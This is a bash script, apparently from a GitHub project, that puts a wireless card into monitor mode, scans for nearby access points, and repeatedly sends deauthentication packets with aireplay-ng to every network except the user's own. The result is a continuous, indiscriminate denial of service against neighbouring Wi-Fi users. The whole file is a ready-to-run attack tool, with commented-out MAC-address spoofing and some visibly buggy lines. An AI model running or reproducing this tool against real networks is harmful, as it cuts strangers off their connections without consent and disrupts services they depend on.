#!/bin/bash
# Mass-Deauth Script by RFKiller <http://rfkiller.they.org>
# Send all complaints and improvements on GitHub <https://github.com/RFKiller/mass-deauth>
# Licensed as GPLv3 on 2013 by RFKiller
# Please see the README file that came with this script
# Version 1.0 BETA (June 14, 2016)

if [[ $EUID -ne 0 ]]; then
	echo -e "\033[31m\n[!] This script MUST be run as root. Aborting...\033[0m\n" 1>&2
	sleep 0.5; exit 1
fi

for i in airmon-ng aireplay-ng iw ip iwlist macchanger; do
	command -v $i > /dev/null 2>&1 || {
		echo -e >&2 "\033[31m\n[!] This script requires $i to be installed. Aborting...\033[0m\n"
		sleep 0.5; exit 1
	}
done

function usage() {
	cat << EOF

    Usage: $0 [OPTIONS] [ARGUMENTS]

    OPTIONS:
	-d	number of deauth packets to send per AP
	-h	show this help screen
	-i	wireless interface to use during attack
	-m	MAC of your AP (so we don't attack it)
	-w	wait time (in seconds) between attacks

    Example: $0 -d 10 -w 30 -m 11:22:33:44:55:66 -i wlan0

EOF
}

flags=':d:hi:m:w:'
while getopts $flags option; do
	case $option in
		d) DEAUTHS=$OPTARG;;
		h) usage; exit;;
		i) WIFACE=$OPTARG;;
		m) ourAPmac=$OPTARG;;
		w) waitTime=$OPTARG;;
		\?) echo "Unknown option: -$OPTARG" >&2; exit 1;;
		:) echo "Missing argument for option: -$OPTARG" >&2; exit 1;;
		*) echo "Unimplemented option: -$OPTARG" >&2; exit 1;;
	esac
done
shift $(($OPTIND - 1))

function set_mon0 {
    MIFACE=$(ip link set $WIFACE up && iw dev | awk '$0 ~ /Interface / {print $WIFACE}' | iw dev $WIFACE interface add mon0 type monitor &> /dev/null)
    ip link set $WIFACE up &> /dev/null
    ip link set $MIFACE up &> /dev/null
}
function rmlogs() {
	if [ -e "/tmp/scan.tmp" ]; then rm /tmp/scan.tmp ; fi
	#if [ -e "/tmp/APmacs.lst" ]; then rm /tmp/APmacs.lst ; fi
	if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi
}
function cleanup() {
	echo -e "\n\n\033[31m[!] Killing aireplay-ng and mon0...\033[0m"
	killall -9 aireplay-ng &> /dev/null
	iw dev mon0 del &> /dev/null
	echo -e "\033[31m[!] Removing logs and scan data...\033[0m\n"
	sleep 1; rmlogs
	exit 0
}

atk="0"
#MIFACE=$(iw dev | awk '$0 ~ /Interface / {print $2}' | grep mon0)
ask_to_install="1" # Change to 0 or comment out this line to skip asking for installation
suggestedAPmac=$(arp -a | grep -E -o '[[:xdigit:]]{2}(:[[:xdigit:]]{2}){5}')

clear

if [[ ! -e '/usr/local/bin/mass-deauth' && $ask_to_install = '1' ]];then
	echo -e "\033[31m[!] Script is not installed. Do you want to install it? (y/n)\033[0m"
	read -n1 install
	if [[ $install = Y || $install = y ]] ; then
		cp $0 /usr/local/bin/mass-deauth
		chmod +x /usr/local/bin/mass-deauth
		rm -rf ../mass-deauth
		echo -e "\n\n\033[32m[+] Script should now be installed. Launching it now!\033[0m\n"
		sleep 3
		mass-deauth
		exit 1
	else
		echo -e "\n\n\033[31m[!] Ok, not installing then! We will just continue instead.\033[0m\n"
	fi
fi

echo -e "\033[32m[+] Setting up for attack...\033[0m"; sleep 0.5
echo
#echo -e "\033[32m[+] Searching for interface in monitor mode...\033[0m\n"; sleep 1
# next while loop will be dependent on monitor mode search results when implimented
while [[ ! $WIFACE ]]; do
	# while this do that
		# echo -e "\033[31m[!] No interface found in monitor mode!\033[0m"
	# done
	echo -e "\033[33m[-] Type the wireless interface you'd like to use and hit [ENTER]:\033[0m"
	read -e WIFACE
	sleep 0.5; echo
done
set_mon0
while [[ ! $DEAUTHS ]]; do
	echo -e "\033[33m[-] How many deauthentication packets would you to send to each router?\n[-] Hit [ENTER] to use the default (15)\033[0m"
	read -e DEAUTHS
	if [[ -z $DEAUTHS ]]; then
		echo -e "\033[32m[+] Sending 15 deauthentication packets per round of attacks\033[0m"
		DEAUTHS=15
	else
		echo -e "\n\033[32m[+] Sending $DEAUTHS deauthentication packets per round of attacks\033[0m"
	fi
	sleep 0.5; echo
done
while [[ ! $waitTime ]]; do
	echo -e "\033[33m[-] How long would you like to wait (in seconds) between attacks?\n[-] Hit [ENTER] to use the default (60 seconds)\033[0m"
	read -e waitTime
	if [[ -z $waitTime ]]; then
		echo -e "\033[32m[+] Waiting 60 seconds between attacks\033[0m"
		waitTime=60
	else
		echo -e "\n\033[32m[+] Waiting $waitTime seconds between attacks\033[0m"
	fi
	sleep 0.5; echo
done
while [[ ! $ourAPmac ]]; do
	echo -e "\033[33m[-] Enter the MAC address of YOUR router (so we don't attack it):\n[-] Hit [ENTER] to use the default ($suggestedAPmac)\033[0m"
	read -e ourAPmac
	if [[ -z $ourAPmac ]]; then
		echo -e "\033[32m[+] Using $suggestedAPmac as the MAC address for your router\033[0m"
		ourAPmac=$suggestedAPmac
	fi
	sleep 0.5; echo
done
export ourAPmac

trap cleanup INT
rmlogs
ip link set $WIFACE up &> /dev/null
ip link set mon0 up &> /dev/null

#echo -e "\033[33m[-] Changing wireless card MAC address...\033[0m"; sleep 3
#ip link set $MIFACE down && macchanger -A $MIFACE && ip link set $MIFACE up && echo -e "\033[32m[+] $MIFACE interface MAC address successfully changed!"
#sleep 1; echo

scan1="0"
while true; do
	rmlogs
    ifconfig mon0 up &> /dev/null; sleep 0.5
	iwlist $WIFACE scan > /tmp/scan.tmp
	#awk --posix '$5 ~ /[0-9a-zA-F]{2}:/ && $5 !~ /'$ourAPmac'/ {print $5}' /tmp/scan.tmp > /tmp/APmacs.lst
	cat /tmp/scan.tmp | grep "Address:" | grep -v "$ourAPmac" | cut -b 30-60 > /tmp/APmacs.lst
	cat /tmp/scan.tmp | grep "Channel:" | cut -b 29 > /tmp/APchannels.lst
	lineNum=`wc -l /tmp/APmacs.lst | awk '{ print $1}'`
	echo -e "\033[32m[+] Deauthenticating $lineNum APs from scan data...\033[0m"
	for (( b=1; b<=$lineNum; b++ )); do
			scan1="1"
			curCHAN=`cat /tmp/APchannels.lst | head -n $b`
			curAP=`sed -n -e ''$b'p' '/tmp/APmacs.lst'`
			echo -e "\033[32m[+] Deauthenticating all clients on $curAP...\033[0m"
			aireplay-ng -0 $DEAUTHS -D -a $curAP mon0 &> /dev/null &
	done
	atk="1"
	echo -e "\033[33m[-] Sleeping for $waitTime seconds...\n\n[-] Press [ CTRL+C ]  in this window to kill attack...\033[0m\n" && sleep $waitTime
	for active in `jobs -p`; do
		wait $active
	done
done
